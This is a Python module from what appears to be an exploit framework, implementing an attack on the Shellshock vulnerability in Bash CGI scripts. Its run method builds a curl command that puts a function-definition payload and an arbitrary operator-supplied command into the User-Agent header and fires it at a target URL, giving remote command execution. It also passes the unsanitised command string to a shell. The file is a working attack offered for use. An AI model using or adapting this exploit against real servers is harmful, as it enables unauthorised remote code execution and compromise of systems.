from .internal.base import Exploit

class ShellShock(Exploit):
    def __init__(self):
        super().__init__()
        self.prompt = "[ShellShock] > "

        self.info["Author"] = "Alexis Rodriguez <binexisHATT>"
        self.info["Author Repo"] = "http://github.com/binexisHATT"
        self.info["Description"] = "an exploit for the Shellshock vulnerability"
        self.info["Date Completed"] = "02/23/2021"

        self.args = {
            "url" : 
                { "description": "vulnerable cgi URL",
                  "required": True },
            "cmd" :
                { "description": "command to run on vulnerable target",
                  "required": True }
        }

        for arg in self.args.keys():
            self.__dict__[arg] = "N/a"

    def run(self):
        from subprocess import run as execute
        from sys import exit
        try:
            exploit = 'curl -H \"user-agent: () { :; }; echo; echo; /bin/bash -c '
            exploit += '\'' + self.cmd + '\'"'
            exploit += ' ' + self.url
            print(f"Executing payload:\n{exploit}")

            execute(exploit, shell=True)
        except:
            raise Exception("an error occured running the exploit!!!")
            return
